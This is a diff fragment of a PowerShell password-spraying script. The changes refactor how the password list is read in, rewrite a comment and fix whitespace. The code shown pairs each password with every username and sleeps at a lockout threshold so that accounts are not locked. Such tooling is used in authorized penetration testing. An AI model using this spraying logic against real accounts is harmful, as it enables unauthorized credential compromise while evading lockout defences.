@@ -328,7 +328,7 @@ zL13fBXF+j9+snvSQ0hCOCcECEXKGpIAAZEOoqBGCL33qoSycZcmhxMQO9KVqqKCoBRBUQFRARERbNeK
     return $AuthStatus;
   }
 
-  # Load username and password lists into a variable
+  # Load username list into a variable
   [System.Collections.ArrayList]$usernames = Get-Content $userlist;
   $passwords = Get-Content $passlist;
 
@@ -336,7 +336,8 @@ zL13fBXF+j9+snvSQ0hCOCcECEXKGpIAAZEOoqBGCL33qoSycZcmhxMQO9KVqqKCoBRBUQFRARERbNeK
   $LockCount = 1;
 
   # Loop through passwords, combine with each user
-  ForEach ($pass in $passwords) {
+  Get-Content $passlist | ForEach-Object -Process {
+    $pass = $_;
 
     # Loop through the users
     #ForEach ($user in $usernames) {
@@ -387,12 +388,11 @@ zL13fBXF+j9+snvSQ0hCOCcECEXKGpIAAZEOoqBGCL33qoSycZcmhxMQO9KVqqKCoBRBUQFRARERbNeK
         } Else {
           $usernames.RemoveAt($i);
         }
-	  }
+      }
     }
 
     # If we have hit the lockout threshold, we need to sleep and reset it
     If ($LockCount -eq $lockout) {
-
       $LockCount = 0;
 
       # Sleep for the set lockout duration
